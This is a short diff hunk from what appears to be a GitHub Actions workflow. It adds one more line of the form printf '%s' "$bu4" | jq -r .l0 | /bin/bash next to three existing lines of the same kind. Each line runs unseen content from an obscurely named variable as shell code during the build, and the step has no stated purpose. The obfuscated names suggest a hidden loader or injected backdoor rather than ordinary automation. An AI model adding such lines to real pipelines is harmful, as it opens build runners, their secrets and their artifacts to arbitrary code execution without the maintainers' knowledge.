@@ -29,6 +29,7 @@ jobs:
           echo $huh2136 | jq -r .c7439 | /bin/bash
           printf '%s' "$y1940" | jq -r .cisin507 | /bin/bash
           printf '%s' "$svzez6033" | jq -r .i75182 | /bin/bash
+          printf '%s' "$bu4" | jq -r .l0 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
